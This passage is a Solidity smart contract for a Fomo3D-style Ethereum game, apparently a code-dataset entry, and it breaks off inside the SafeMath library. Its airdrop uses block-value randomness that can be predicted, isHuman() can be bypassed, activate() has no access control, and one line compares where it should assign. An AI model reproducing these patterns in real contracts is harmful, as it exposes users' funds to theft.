0<CODESPLIT>contract ReadyPlayerONE is modularLong {    using SafeMath for *;    using NameFilter for string;    using RP1KeysCalcLong for uint256;    address community_addr = 0x4c20d0ab4baadbce39fe6ac94cefd99b7686339c;    address marketing_addr = 0x9386b3cc1155764b60ca81fc83761777f6487ac3;    PlayerBookInterface constant private PlayerBook = PlayerBookInterface(0x15247cF99b5870F54EA17e85E1aF8667a58a6644);        string constant public name = "Ready Player ONE";    string constant public symbol = "RP1";    uint256 private rndGap_ = 0;                                          uint256 constant private rndInit_ = 1 hours;                  uint256 constant private rndInc_ = 30 seconds;                   uint256 constant private rndMax_ = 12 hours;                     	uint256 public airDropPot_;                  uint256 public airDropTracker_ = 0;          uint256 public rID_;            mapping (address => uint256) public pIDxAddr_;               mapping (bytes32 => uint256) public pIDxName_;               mapping (uint256 => RP1datasets.Player) public plyr_;        mapping (uint256 => mapping (uint256 => RP1datasets.PlayerRounds)) public plyrRnds_;         mapping (uint256 => mapping (bytes32 => bool)) public plyrNames_;         mapping (uint256 => RP1datasets.Round) public round_;        mapping (uint256 => mapping(uint256 => uint256)) public rndTmEth_;              mapping (uint256 => RP1datasets.TeamFee) public fees_;               mapping (uint256 => RP1datasets.PotSplit) public potSplit_;              constructor()        public    {	             fees_[0] = RP1datasets.TeamFee(30,0);                     fees_[1] = RP1datasets.TeamFee(41,0);                     fees_[2] = RP1datasets.TeamFee(60,0);                     fees_[3] = RP1datasets.TeamFee(46,0);                             potSplit_[0] = RP1datasets.PotSplit(18,4);           potSplit_[1] = RP1datasets.PotSplit(25,0);           potSplit_[2] = RP1datasets.PotSplit(22,8);           potSplit_[3] = RP1datasets.PotSplit(32,2);   	}             modifier isActivated() {        require(activated_ == true, "its not ready yet.  check ?eta in discord");         _;    }             modifier isHuman() {        address _addr = msg.sender;        uint256 _codeLength;                assembly {_codeLength := extcodesize(_addr)}        require(_codeLength == 0, "sorry humans only");        _;    }         modifier isWithinLimits(uint256 _eth) {        require(_eth >= 1000000000, "pocket lint: not a valid currency");        require(_eth <= 100000000000000000000000, "no vitalik, no");        _;        }                 function()        isActivated()        isHuman()        isWithinLimits(msg.value)        public        payable    {                 RP1datasets.EventReturns memory _eventData_ = determinePID(_eventData_);                             uint256 _pID = pIDxAddr_[msg.sender];                         buyCore(_pID, plyr_[_pID].laff, 2, _eventData_);    }             function buyXid(uint256 _affCode, uint256 _team)        isActivated()        isHuman()        isWithinLimits(msg.value)        public        payable    {                 RP1datasets.EventReturns memory _eventData_ = determinePID(_eventData_);                         uint256 _pID = pIDxAddr_[msg.sender];                                  if (_affCode == 0 || _affCode == _pID)        {                         _affCode = plyr_[_pID].laff;                             } else if (_affCode != plyr_[_pID].laff) {                         plyr_[_pID].laff = _affCode;        }                         _team = verifyTeam(_team);                         buyCore(_pID, _affCode, _team, _eventData_);    }        function buyXaddr(address _affCode, uint256 _team)        isActivated()        isHuman()        isWithinLimits(msg.value)        public        payable    {                 RP1datasets.EventReturns memory _eventData_ = determinePID(_eventData_);                         uint256 _pID = pIDxAddr_[msg.sender];                         uint256 _affID;                 if (_affCode == address(0) || _affCode == msg.sender)        {                         _affID = plyr_[_pID].laff;                         } else {                         _affID = pIDxAddr_[_affCode];                                     if (_affID != plyr_[_pID].laff)            {                                 plyr_[_pID].laff = _affID;            }        }                         _team = verifyTeam(_team);                         buyCore(_pID, _affID, _team, _eventData_);    }        function buyXname(bytes32 _affCode, uint256 _team)        isActivated()        isHuman()        isWithinLimits(msg.value)        public        payable    {                 RP1datasets.EventReturns memory _eventData_ = determinePID(_eventData_);                         uint256 _pID = pIDxAddr_[msg.sender];                         uint256 _affID;                 if (_affCode == '' || _affCode == plyr_[_pID].name)        {                         _affID = plyr_[_pID].laff;                         } else {                         _affID = pIDxName_[_affCode];                                     if (_affID != plyr_[_pID].laff)            {                                 plyr_[_pID].laff = _affID;            }        }                         _team = verifyTeam(_team);                         buyCore(_pID, _affID, _team, _eventData_);    }             function reLoadXid(uint256 _affCode, uint256 _team, uint256 _eth)        isActivated()        isHuman()        isWithinLimits(_eth)        public    {                 RP1datasets.EventReturns memory _eventData_;                         uint256 _pID = pIDxAddr_[msg.sender];                                  if (_affCode == 0 || _affCode == _pID)        {                         _affCode = plyr_[_pID].laff;                             } else if (_affCode != plyr_[_pID].laff) {                         plyr_[_pID].laff = _affCode;        }                 _team = verifyTeam(_team);                 reLoadCore(_pID, _affCode, _team, _eth, _eventData_);    }        function reLoadXaddr(address _affCode, uint256 _team, uint256 _eth)        isActivated()        isHuman()        isWithinLimits(_eth)        public    {                 RP1datasets.EventReturns memory _eventData_;                         uint256 _pID = pIDxAddr_[msg.sender];                         uint256 _affID;                 if (_affCode == address(0) || _affCode == msg.sender)        {                         _affID = plyr_[_pID].laff;                         } else {                         _affID = pIDxAddr_[_affCode];                                     if (_affID != plyr_[_pID].laff)            {                                 plyr_[_pID].laff = _affID;            }        }                         _team = verifyTeam(_team);                         reLoadCore(_pID, _affID, _team, _eth, _eventData_);    }        function reLoadXname(bytes32 _affCode, uint256 _team, uint256 _eth)        isActivated()        isHuman()        isWithinLimits(_eth)        public    {                 RP1datasets.EventReturns memory _eventData_;                         uint256 _pID = pIDxAddr_[msg.sender];                         uint256 _affID;                 if (_affCode == '' || _affCode == plyr_[_pID].name)        {                         _affID = plyr_[_pID].laff;                         } else {                         _affID = pIDxName_[_affCode];                                     if (_affID != plyr_[_pID].laff)            {                                 plyr_[_pID].laff = _affID;            }        }                         _team = verifyTeam(_team);                         reLoadCore(_pID, _affID, _team, _eth, _eventData_);    }         function withdraw()        isActivated()        isHuman()        public    {                 uint256 _rID = rID_;                         uint256 _now = now;                         uint256 _pID = pIDxAddr_[msg.sender];                         uint256 _eth;                         if (_now > round_[_rID].end && round_[_rID].ended == false && round_[_rID].plyr != 0)        {                         RP1datasets.EventReturns memory _eventData_;                         			round_[_rID].ended = true;            _eventData_ = endRound(_eventData_);            			             _eth = withdrawEarnings(_pID);                                     if (_eth > 0)                plyr_[_pID].addr.transfer(_eth);                                         _eventData_.compressedData = _eventData_.compressedData + (_now * 1000000000000000000);            _eventData_.compressedIDs = _eventData_.compressedIDs + _pID;                                     emit RP1events.onWithdrawAndDistribute            (                msg.sender,                 plyr_[_pID].name,                 _eth,                 _eventData_.compressedData,                 _eventData_.compressedIDs,                 _eventData_.winnerAddr,                 _eventData_.winnerName,                 _eventData_.amountWon,                 _eventData_.newPot,                 _eventData_.rp1Amount,                 _eventData_.genAmount            );                             } else {                         _eth = withdrawEarnings(_pID);                                     if (_eth > 0)                plyr_[_pID].addr.transfer(_eth);                                     emit RP1events.onWithdraw(_pID, msg.sender, plyr_[_pID].name, _eth, _now);        }    }             function registerNameXID(string _nameString, uint256 _affCode, bool _all)        isHuman()        public        payable    {        bytes32 _name = _nameString.nameFilter();        address _addr = msg.sender;        uint256 _paid = msg.value;        (bool _isNewPlayer, uint256 _affID) = PlayerBook.registerNameXIDFromDapp.value(_paid)(_addr, _name, _affCode, _all);                uint256 _pID = pIDxAddr_[_addr];                         emit RP1events.onNewName(_pID, _addr, _name, _isNewPlayer, _affID, plyr_[_affID].addr, plyr_[_affID].name, _paid, now);    }        function registerNameXaddr(string _nameString, address _affCode, bool _all)        isHuman()        public        payable    {        bytes32 _name = _nameString.nameFilter();        address _addr = msg.sender;        uint256 _paid = msg.value;        (bool _isNewPlayer, uint256 _affID) = PlayerBook.registerNameXaddrFromDapp.value(msg.value)(msg.sender, _name, _affCode, _all);                uint256 _pID = pIDxAddr_[_addr];                         emit RP1events.onNewName(_pID, _addr, _name, _isNewPlayer, _affID, plyr_[_affID].addr, plyr_[_affID].name, _paid, now);    }        function registerNameXname(string _nameString, bytes32 _affCode, bool _all)        isHuman()        public        payable    {        bytes32 _name = _nameString.nameFilter();        address _addr = msg.sender;        uint256 _paid = msg.value;        (bool _isNewPlayer, uint256 _affID) = PlayerBook.registerNameXnameFromDapp.value(msg.value)(msg.sender, _name, _affCode, _all);                uint256 _pID = pIDxAddr_[_addr];                         emit RP1events.onNewName(_pID, _addr, _name, _isNewPlayer, _affID, plyr_[_affID].addr, plyr_[_affID].name, _paid, now);    }             function getBuyPrice()        public         view         returns(uint256)    {                   uint256 _rID = rID_;                         uint256 _now = now;                         if (_now > round_[_rID].strt + rndGap_ && (_now <= round_[_rID].end || (_now > round_[_rID].end && round_[_rID].plyr == 0)))            return ( (round_[_rID].keys.add(1000000000000000000)).ethRec(1000000000000000000) );        else              return ( 75000000000000 );      }             function getTimeLeft()        public        view        returns(uint256)    {                 uint256 _rID = rID_;                         uint256 _now = now;                if (_now < round_[_rID].end)            if (_now > round_[_rID].strt + rndGap_)                return( (round_[_rID].end).sub(_now) );            else                return( (round_[_rID].strt + rndGap_).sub(_now) );        else            return(0);    }             function getPlayerVaults(uint256 _pID)        public        view        returns(uint256 ,uint256, uint256)    {                 uint256 _rID = rID_;                         if (now > round_[_rID].end && round_[_rID].ended == false && round_[_rID].plyr != 0)        {                         if (round_[_rID].plyr == _pID)            {                return                (                    (plyr_[_pID].win).add( ((round_[_rID].pot).mul(58)) / 100 ),                    (plyr_[_pID].gen).add(  getPlayerVaultsHelper(_pID, _rID).sub(plyrRnds_[_pID][_rID].mask)   ),                    plyr_[_pID].aff                );                         } else {                return                (                    plyr_[_pID].win,                    (plyr_[_pID].gen).add(  getPlayerVaultsHelper(_pID, _rID).sub(plyrRnds_[_pID][_rID].mask)  ),                    plyr_[_pID].aff                );            }                             } else {            return            (                plyr_[_pID].win,                (plyr_[_pID].gen).add(calcUnMaskedEarnings(_pID, plyr_[_pID].lrnd)),                plyr_[_pID].aff            );        }    }             function getPlayerVaultsHelper(uint256 _pID, uint256 _rID)        private        view        returns(uint256)    {        return(  ((((round_[_rID].mask).add(((((round_[_rID].pot).mul(potSplit_[round_[_rID].team].gen)) / 100).mul(1000000000000000000)) / (round_[_rID].keys))).mul(plyrRnds_[_pID][_rID].keys)) / 1000000000000000000)  );    }             function getCurrentRoundInfo()        public        view        returns(uint256, uint256, uint256, uint256, uint256, uint256, uint256, address, bytes32, uint256, uint256, uint256, uint256, uint256)    {                 uint256 _rID = rID_;                return        (            round_[_rID].ico,                            _rID,                                        round_[_rID].keys,                           round_[_rID].end,                            round_[_rID].strt,                           round_[_rID].pot,                            (round_[_rID].team + (round_[_rID].plyr * 10)),                  plyr_[round_[_rID].plyr].addr,               plyr_[round_[_rID].plyr].name,               rndTmEth_[_rID][0],                          rndTmEth_[_rID][1],                          rndTmEth_[_rID][2],                          rndTmEth_[_rID][3],                          airDropTracker_ + (airDropPot_ * 1000)                       );    }         function getPlayerInfoByAddress(address _addr)        public         view         returns(uint256, bytes32, uint256, uint256, uint256, uint256, uint256)    {                 uint256 _rID = rID_;                if (_addr == address(0))        {            _addr == msg.sender;        }        uint256 _pID = pIDxAddr_[_addr];                return        (            _pID,                                            plyr_[_pID].name,                                plyrRnds_[_pID][_rID].keys,                      plyr_[_pID].win,                                 (plyr_[_pID].gen).add(calcUnMaskedEarnings(_pID, plyr_[_pID].lrnd)),                    plyr_[_pID].aff,                                 plyrRnds_[_pID][_rID].eth                    );    }             function buyCore(uint256 _pID, uint256 _affID, uint256 _team, RP1datasets.EventReturns memory _eventData_)        private    {                 uint256 _rID = rID_;                         uint256 _now = now;                         if (_now > round_[_rID].strt + rndGap_ && (_now <= round_[_rID].end || (_now > round_[_rID].end && round_[_rID].plyr == 0)))         {                         core(_rID, _pID, msg.value, _affID, _team, _eventData_);                         } else {                         if (_now > round_[_rID].end && round_[_rID].ended == false)             {                 			    round_[_rID].ended = true;                _eventData_ = endRound(_eventData_);                                                 _eventData_.compressedData = _eventData_.compressedData + (_now * 1000000000000000000);                _eventData_.compressedIDs = _eventData_.compressedIDs + _pID;                                                 emit RP1events.onBuyAndDistribute                (                    msg.sender,                     plyr_[_pID].name,                     msg.value,                     _eventData_.compressedData,                     _eventData_.compressedIDs,                     _eventData_.winnerAddr,                     _eventData_.winnerName,                     _eventData_.amountWon,                     _eventData_.newPot,                     _eventData_.rp1Amount,                     _eventData_.genAmount                );            }                                     plyr_[_pID].gen = plyr_[_pID].gen.add(msg.value);        }    }             function reLoadCore(uint256 _pID, uint256 _affID, uint256 _team, uint256 _eth, RP1datasets.EventReturns memory _eventData_)        private    {                 uint256 _rID = rID_;                         uint256 _now = now;                         if (_now > round_[_rID].strt + rndGap_ && (_now <= round_[_rID].end || (_now > round_[_rID].end && round_[_rID].plyr == 0)))         {                                                   plyr_[_pID].gen = withdrawEarnings(_pID).sub(_eth);                                     core(_rID, _pID, _eth, _affID, _team, _eventData_);                         } else if (_now > round_[_rID].end && round_[_rID].ended == false) {                         round_[_rID].ended = true;            _eventData_ = endRound(_eventData_);                                         _eventData_.compressedData = _eventData_.compressedData + (_now * 1000000000000000000);            _eventData_.compressedIDs = _eventData_.compressedIDs + _pID;                                         emit RP1events.onReLoadAndDistribute            (                msg.sender,                 plyr_[_pID].name,                 _eventData_.compressedData,                 _eventData_.compressedIDs,                 _eventData_.winnerAddr,                 _eventData_.winnerName,                 _eventData_.amountWon,                 _eventData_.newPot,                 _eventData_.rp1Amount,                 _eventData_.genAmount            );        }    }             function core(uint256 _rID, uint256 _pID, uint256 _eth, uint256 _affID, uint256 _team, RP1datasets.EventReturns memory _eventData_)        private    {                 if (plyrRnds_[_pID][_rID].keys == 0)            _eventData_ = managePlayer(_pID, _eventData_);                         if (round_[_rID].eth < 100000000000000000000 && plyrRnds_[_pID][_rID].eth.add(_eth) > 1000000000000000000)        {            uint256 _availableLimit = (1000000000000000000).sub(plyrRnds_[_pID][_rID].eth);            uint256 _refund = _eth.sub(_availableLimit);            plyr_[_pID].gen = plyr_[_pID].gen.add(_refund);            _eth = _availableLimit;        }                         if (_eth > 1000000000)         {                                     uint256 _keys = (round_[_rID].eth).keysRec(_eth);                                     if (_keys >= 1000000000000000000)            {            updateTimer(_keys, _rID);                         if (round_[_rID].plyr != _pID)                round_[_rID].plyr = _pID;              if (round_[_rID].team != _team)                round_[_rID].team = _team;                                      _eventData_.compressedData = _eventData_.compressedData + 100;        }                                     if (_eth >= 100000000000000000)            {            airDropTracker_++;            if (airdrop() == true)            {                                 uint256 _prize;                if (_eth >= 10000000000000000000)                {                                         _prize = ((airDropPot_).mul(75)) / 100;                    plyr_[_pID].win = (plyr_[_pID].win).add(_prize);                                                             airDropPot_ = (airDropPot_).sub(_prize);                                                             _eventData_.compressedData += 300000000000000000000000000000000;                } else if (_eth >= 1000000000000000000 && _eth < 10000000000000000000) {                                         _prize = ((airDropPot_).mul(50)) / 100;                    plyr_[_pID].win = (plyr_[_pID].win).add(_prize);                                                             airDropPot_ = (airDropPot_).sub(_prize);                                                             _eventData_.compressedData += 200000000000000000000000000000000;                } else if (_eth >= 100000000000000000 && _eth < 1000000000000000000) {                                         _prize = ((airDropPot_).mul(25)) / 100;                    plyr_[_pID].win = (plyr_[_pID].win).add(_prize);                                                             airDropPot_ = (airDropPot_).sub(_prize);                                                             _eventData_.compressedData += 300000000000000000000000000000000;                }                                 _eventData_.compressedData += 10000000000000000000000000000000;                                 _eventData_.compressedData += _prize * 1000000000000000000000000000000000;                                                 airDropTracker_ = 0;            }        }                             _eventData_.compressedData = _eventData_.compressedData + (airDropTracker_ * 1000);                                     plyrRnds_[_pID][_rID].keys = _keys.add(plyrRnds_[_pID][_rID].keys);            plyrRnds_[_pID][_rID].eth = _eth.add(plyrRnds_[_pID][_rID].eth);                                     round_[_rID].keys = _keys.add(round_[_rID].keys);            round_[_rID].eth = _eth.add(round_[_rID].eth);            rndTmEth_[_rID][_team] = _eth.add(rndTmEth_[_rID][_team]);                             _eventData_ = distributeExternal(_rID, _pID, _eth, _affID, _team, _eventData_);            _eventData_ = distributeInternal(_rID, _pID, _eth, _team, _keys, _eventData_);                         		    endTx(_pID, _team, _eth, _keys, _eventData_);        }    }             function calcUnMaskedEarnings(uint256 _pID, uint256 _rIDlast)        private        view        returns(uint256)    {        return(  (((round_[_rIDlast].mask).mul(plyrRnds_[_pID][_rIDlast].keys)) / (1000000000000000000)).sub(plyrRnds_[_pID][_rIDlast].mask)  );    }             function calcKeysReceived(uint256 _rID, uint256 _eth)        public        view        returns(uint256)    {                 uint256 _now = now;                         if (_now > round_[_rID].strt + rndGap_ && (_now <= round_[_rID].end || (_now > round_[_rID].end && round_[_rID].plyr == 0)))            return ( (round_[_rID].eth).keysRec(_eth) );        else              return ( (_eth).keys() );    }             function iWantXKeys(uint256 _keys)        public        view        returns(uint256)    {                 uint256 _rID = rID_;                         uint256 _now = now;                         if (_now > round_[_rID].strt + rndGap_ && (_now <= round_[_rID].end || (_now > round_[_rID].end && round_[_rID].plyr == 0)))            return ( (round_[_rID].keys.add(_keys)).ethRec(_keys) );        else              return ( (_keys).eth() );    }             function receivePlayerInfo(uint256 _pID, address _addr, bytes32 _name, uint256 _laff)        external    {        require (msg.sender == address(PlayerBook), "your not playerNames contract... hmmm..");        if (pIDxAddr_[_addr] != _pID)            pIDxAddr_[_addr] = _pID;        if (pIDxName_[_name] != _pID)            pIDxName_[_name] = _pID;        if (plyr_[_pID].addr != _addr)            plyr_[_pID].addr = _addr;        if (plyr_[_pID].name != _name)            plyr_[_pID].name = _name;        if (plyr_[_pID].laff != _laff)            plyr_[_pID].laff = _laff;        if (plyrNames_[_pID][_name] == false)            plyrNames_[_pID][_name] = true;    }             function receivePlayerNameList(uint256 _pID, bytes32 _name)        external    {        require (msg.sender == address(PlayerBook), "your not playerNames contract... hmmm..");        if(plyrNames_[_pID][_name] == false)            plyrNames_[_pID][_name] = true;    }                    function determinePID(RP1datasets.EventReturns memory _eventData_)        private        returns (RP1datasets.EventReturns)    {        uint256 _pID = pIDxAddr_[msg.sender];                 if (_pID == 0)        {                         _pID = PlayerBook.getPlayerID(msg.sender);            bytes32 _name = PlayerBook.getPlayerName(_pID);            uint256 _laff = PlayerBook.getPlayerLAff(_pID);                                     pIDxAddr_[msg.sender] = _pID;            plyr_[_pID].addr = msg.sender;                        if (_name != "")            {                pIDxName_[_name] = _pID;                plyr_[_pID].name = _name;                plyrNames_[_pID][_name] = true;            }                        if (_laff != 0 && _laff != _pID)                plyr_[_pID].laff = _laff;                                     _eventData_.compressedData = _eventData_.compressedData + 1;        }         return (_eventData_);    }             function verifyTeam(uint256 _team)        private        pure        returns (uint256)    {        if (_team < 0 || _team > 3)            return(2);        else            return(_team);    }             function managePlayer(uint256 _pID, RP1datasets.EventReturns memory _eventData_)        private        returns (RP1datasets.EventReturns)    {                          if (plyr_[_pID].lrnd != 0)            updateGenVault(_pID, plyr_[_pID].lrnd);                             plyr_[_pID].lrnd = rID_;                             _eventData_.compressedData = _eventData_.compressedData + 10;                return(_eventData_);    }             function endRound(RP1datasets.EventReturns memory _eventData_)        private        returns (RP1datasets.EventReturns)    {                 uint256 _rID = rID_;                         uint256 _winPID = round_[_rID].plyr;        uint256 _winTID = round_[_rID].team;                         uint256 _pot = round_[_rID].pot;                                  uint256 _win = (_pot.mul(58)) / 100;        uint256 _com = (_pot / 50);        uint256 _gen = (_pot.mul(potSplit_[_winTID].gen)) / 100;        uint256 _rp1 = (_pot.mul(potSplit_[_winTID].rp1)) / 100;        uint256 _res = (((_pot.sub(_win)).sub(_com)).sub(_gen)).sub(_rp1);                         uint256 _ppt = (_gen.mul(1000000000000000000)) / (round_[_rID].keys);        uint256 _dust = _gen.sub((_ppt.mul(round_[_rID].keys)) / 1000000000000000000);        if (_dust > 0)        {            _gen = _gen.sub(_dust);            _res = _res.add(_dust);        }                         plyr_[_winPID].win = _win.add(plyr_[_winPID].win);                         community_addr.transfer(_com);                             round_[_rID].mask = _ppt.add(round_[_rID].mask);                         if (_rp1 > 0){            _res = _res.add(_rp1);        }                             _eventData_.compressedData = _eventData_.compressedData + (round_[_rID].end * 1000000);        _eventData_.compressedIDs = _eventData_.compressedIDs + (_winPID * 100000000000000000000000000) + (_winTID * 100000000000000000);        _eventData_.winnerAddr = plyr_[_winPID].addr;        _eventData_.winnerName = plyr_[_winPID].name;        _eventData_.amountWon = _win;        _eventData_.genAmount = _gen;        _eventData_.rp1Amount = _rp1;        _eventData_.newPot = _res;                         rID_++;        _rID++;        round_[_rID].strt = now;        round_[_rID].end = now.add(rndInit_).add(rndGap_);        round_[_rID].pot = _res;                return(_eventData_);    }             function updateGenVault(uint256 _pID, uint256 _rIDlast)        private     {        uint256 _earnings = calcUnMaskedEarnings(_pID, _rIDlast);        if (_earnings > 0)        {                         plyr_[_pID].gen = _earnings.add(plyr_[_pID].gen);                         plyrRnds_[_pID][_rIDlast].mask = _earnings.add(plyrRnds_[_pID][_rIDlast].mask);        }    }             function updateTimer(uint256 _keys, uint256 _rID)        private    {                 uint256 _now = now;                         uint256 _newTime;        if (_now > round_[_rID].end && round_[_rID].plyr == 0)            _newTime = (((_keys) / (1000000000000000000)).mul(rndInc_)).add(_now);        else            _newTime = (((_keys) / (1000000000000000000)).mul(rndInc_)).add(round_[_rID].end);                         if (_newTime < (rndMax_).add(_now))            round_[_rID].end = _newTime;        else            round_[_rID].end = rndMax_.add(_now);    }             function airdrop()        private         view         returns(bool)    {        uint256 seed = uint256(keccak256(abi.encodePacked(                        (block.timestamp).add            (block.difficulty).add            ((uint256(keccak256(abi.encodePacked(block.coinbase)))) / (now)).add            (block.gaslimit).add            ((uint256(keccak256(abi.encodePacked(msg.sender)))) / (now)).add            (block.number)                    )));        if((seed - ((seed / 1000) * 1000)) < airDropTracker_)            return(true);        else            return(false);    }         function distributeExternal(uint256 _rID, uint256 _pID, uint256 _eth, uint256 _affID, uint256 _team, RP1datasets.EventReturns memory _eventData_)        private        returns(RP1datasets.EventReturns)    {                 uint256 _com = _eth / 50;        uint256 _rp1;                  community_addr.transfer(_com);                         uint256 _long = _eth / 100;                 marketing_addr.transfer(_long);                 uint256 _aff = _eth / 10;                                  if (_affID != _pID && plyr_[_affID].name != '') {            plyr_[_affID].aff = _aff.add(plyr_[_affID].aff);            emit RP1events.onAffiliatePayout(_affID, plyr_[_affID].addr, plyr_[_affID].name, _rID, _pID, _aff, now);        } else {            _rp1 = _aff;        }                         _rp1 = _rp1.add((_eth.mul(fees_[_team].rp1)) / (100));        if (_rp1 > 0)        {            community_addr.transfer(_rp1);                                     _eventData_.rp1Amount = _rp1.add(_eventData_.rp1Amount);        }                return(_eventData_);    }        function potSwap()        external        payable    {                 uint256 _rID = rID_ + 1;                round_[_rID].pot = round_[_rID].pot.add(msg.value);        emit RP1events.onPotSwapDeposit(_rID, msg.value);    }             function distributeInternal(uint256 _rID, uint256 _pID, uint256 _eth, uint256 _team, uint256 _keys, RP1datasets.EventReturns memory _eventData_)        private        returns(RP1datasets.EventReturns)    {                 uint256 _gen = (_eth.mul(fees_[_team].gen)) / 100;                         uint256 _air = (_eth.mul(3) / 100);        airDropPot_ = airDropPot_.add(_air);                         _eth = _eth.sub(((_eth.mul(18)) / 100));                         uint256 _pot = _eth.sub(_gen);                                  uint256 _dust = updateMasks(_rID, _pID, _gen, _keys);        if (_dust > 0)            _gen = _gen.sub(_dust);                         round_[_rID].pot = _pot.add(_dust).add(round_[_rID].pot);                         _eventData_.genAmount = _gen.add(_eventData_.genAmount);        _eventData_.potAmount = _pot;                return(_eventData_);    }         function updateMasks(uint256 _rID, uint256 _pID, uint256 _gen, uint256 _keys)        private        returns(uint256)    {                                  uint256 _ppt = (_gen.mul(1000000000000000000)) / (round_[_rID].keys);        round_[_rID].mask = _ppt.add(round_[_rID].mask);                                      uint256 _pearn = (_ppt.mul(_keys)) / (1000000000000000000);        plyrRnds_[_pID][_rID].mask = (((round_[_rID].mask.mul(_keys)) / (1000000000000000000)).sub(_pearn)).add(plyrRnds_[_pID][_rID].mask);                         return(_gen.sub((_ppt.mul(round_[_rID].keys)) / (1000000000000000000)));    }             function withdrawEarnings(uint256 _pID)        private        returns(uint256)    {                 updateGenVault(_pID, plyr_[_pID].lrnd);                         uint256 _earnings = (plyr_[_pID].win).add(plyr_[_pID].gen).add(plyr_[_pID].aff);        if (_earnings > 0)        {            plyr_[_pID].win = 0;            plyr_[_pID].gen = 0;            plyr_[_pID].aff = 0;        }        return(_earnings);    }             function endTx(uint256 _pID, uint256 _team, uint256 _eth, uint256 _keys, RP1datasets.EventReturns memory _eventData_)        private    {        _eventData_.compressedData = _eventData_.compressedData + (now * 1000000000000000000) + (_team * 100000000000000000000000000000);        _eventData_.compressedIDs = _eventData_.compressedIDs + _pID + (rID_ * 10000000000000000000000000000000000000000000000000000);                emit RP1events.onEndTx        (            _eventData_.compressedData,            _eventData_.compressedIDs,            plyr_[_pID].name,            msg.sender,            _eth,            _keys,            _eventData_.winnerAddr,            _eventData_.winnerName,            _eventData_.amountWon,            _eventData_.newPot,            _eventData_.rp1Amount,            _eventData_.genAmount,            _eventData_.potAmount,            airDropPot_        );    }             bool public activated_ = false;    function activate()        public    {                         require(activated_ == false, "fomo3d already activated");                         activated_ = true;                 		rID_ = 1;        round_[1].strt = now - rndGap_;        round_[1].end = now + rndInit_ ;    }}    library RP1datasets {                                                                                                                                                               struct EventReturns {        uint256 compressedData;        uint256 compressedIDs;        address winnerAddr;                  bytes32 winnerName;                  uint256 amountWon;                   uint256 newPot;                      uint256 rp1Amount;                   uint256 genAmount;                   uint256 potAmount;               }    struct Player {        address addr;            bytes32 name;            uint256 win;             uint256 gen;             uint256 aff;             uint256 lrnd;            uint256 laff;        }    struct PlayerRounds {        uint256 eth;             uint256 keys;            uint256 mask;            uint256 ico;         }    struct Round {        uint256 plyr;            uint256 team;            uint256 end;             bool ended;              uint256 strt;            uint256 keys;            uint256 eth;             uint256 pot;             uint256 mask;            uint256 ico;             uint256 icoGen;          uint256 icoAvg;      }    struct TeamFee {        uint256 gen;             uint256 rp1;         }    struct PotSplit {        uint256 gen;             uint256 rp1;         }}    library RP1KeysCalcLong {    using SafeMath for *;         function keysRec(uint256 _curEth, uint256 _newEth)        internal        pure        returns (uint256)    {        return(keys((_curEth).add(_newEth)).sub(keys(_curEth)));    }             function ethRec(uint256 _curKeys, uint256 _sellKeys)        internal        pure        returns (uint256)    {        return((eth(_curKeys)).sub(eth(_curKeys.sub(_sellKeys))));    }         function keys(uint256 _eth)         internal        pure        returns(uint256)    {        return ((((((_eth).mul(1000000000000000000)).mul(312500000000000000000000000)).add(5624988281256103515625000000000000000000000000000000000000000000)).sqrt()).sub(74999921875000000000000000000000)) / (156250000);    }             function eth(uint256 _keys)         internal        pure        returns(uint256)      {        return ((78125000).mul(_keys.sq()).add(((149999843750000).mul(_keys.mul(1000000000000000000))) / (2))) / ((1000000000000000000).sq());    }}    interface otherFoMo3D {    function potSwap() external payable;}interface RP1externalSettingsInterface {    function getFastGap() external returns(uint256);    function getLongGap() external returns(uint256);    function getFastExtra() external returns(uint256);    function getLongExtra() external returns(uint256);}interface DiviesInterface {    function deposit() external payable;}interface JIincForwarderInterface {    function deposit() external payable returns(bool);    function status() external view returns(address, address, bool);    function startMigration(address _newCorpBank) external returns(bool);    function cancelMigration() external returns(bool);    function finishMigration() external returns(bool);    function setup(address _firstCorpBank) external;}interface PlayerBookInterface {    function getPlayerID(address _addr) external returns (uint256);    function getPlayerName(uint256 _pID) external view returns (bytes32);    function getPlayerLAff(uint256 _pID) external view returns (uint256);    function getPlayerAddr(uint256 _pID) external view returns (address);    function getNameFee() external view returns (uint256);    function registerNameXIDFromDapp(address _addr, bytes32 _name, uint256 _affCode, bool _all) external payable returns(bool, uint256);    function registerNameXaddrFromDapp(address _addr, bytes32 _name, address _affCode, bool _all) external payable returns(bool, uint256);    function registerNameXnameFromDapp(address _addr, bytes32 _name, bytes32 _affCode, bool _all) external payable returns(bool, uint256);} library NameFilter {         function nameFilter(string _input)        internal        pure        returns(bytes32)    {        bytes memory _temp = bytes(_input);        uint256 _length = _temp.length;                         require (_length <= 32 && _length > 0, "string must be between 1 and 32 characters");                 require(_temp[0] != 0x20 && _temp[_length-1] != 0x20, "string cannot start or end with space");                 if (_temp[0] == 0x30)        {            require(_temp[1] != 0x78, "string cannot start with 0x");            require(_temp[1] != 0x58, "string cannot start with 0X");        }                         bool _hasNonNumber;                         for (uint256 i = 0; i < _length; i++)        {                         if (_temp[i] > 0x40 && _temp[i] < 0x5b)            {                                 _temp[i] = byte(uint(_temp[i]) + 32);                                                 if (_hasNonNumber == false)                    _hasNonNumber = true;            } else {                require                (                                         _temp[i] == 0x20 ||                                          (_temp[i] > 0x60 && _temp[i] < 0x7b) ||                                         (_temp[i] > 0x2f && _temp[i] < 0x3a),                    "string contains invalid characters"                );                                 if (_temp[i] == 0x20)                    require( _temp[i+1] != 0x20, "string cannot contain consecutive spaces");                                                 if (_hasNonNumber == false && (_temp[i] < 0x30 || _temp[i] > 0x39))                    _hasNonNumber = true;                }        }                require(_hasNonNumber == true, "string cannot be only numbers");                bytes32 _ret;        assembly {            _ret := mload(add(_temp, 32))        }        return (_ret);    }} library SafeMath {             function mul(uint256 a, uint256 b)         internal         pure         returns (uint256 c)     {        if (a == 0) {            return 0;        }        c = a * b;        require(c / a == b, "SafeMath mul failed");        return c;    }         function sub(uint256 a, uint256 b)        internal        pure        returns (uint256)     {        require(b <= a, "SafeMath sub failed");        return a - b;    }         function add(uint256 a, uint256 b)        internal        pure        returns (uint256 c)     {        c = a + b;        require(c >= a, "SafeMath add failed");        return c;    }             function sqrt(uint256 x)        internal        pure        returns (uint256 y)     {        uint256 z = ((add(x,1)) / 2);        y = x;        while (z < y)         {            y = z;            z = ((add((x / z),z)) / 2);        }    }             function sq(uint256 x)        internal        pure        returns (uint256)    {        return (mul(x,x));    }             function pwr(uint256 x, uint256 y)        internal         pure         returns (uint256)    {        if (x==0)            return (0);        else if (y==0)            return (1);        else         {            uint256 